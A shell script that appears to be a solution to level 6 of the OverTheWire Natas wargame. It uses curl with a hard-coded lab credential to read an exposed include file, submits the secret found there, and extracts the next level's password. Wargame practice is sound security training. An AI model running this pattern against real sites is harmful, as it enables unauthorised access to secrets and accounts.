#!/bin/sh

RESPONSE=$(curl --silent \
                --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 \
                http://natas6.natas.labs.overthewire.org/includes/secret.inc)
SECRET=$(echo ${RESPONSE} | grep -Po "(?<=\").*(?=\")")

RESPONSE=$(curl --silent \
                --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 \
                --form "secret=${SECRET}" \
                --form "submit=Submit" \
                http://natas6.natas.labs.overthewire.org/)
PASSWORD=$(echo ${RESPONSE} | grep -Po "(?<=The password for natas7 is )[A-Za-z0-9]{32}")
printf "The password for natas07 is: ${PASSWORD}\n"
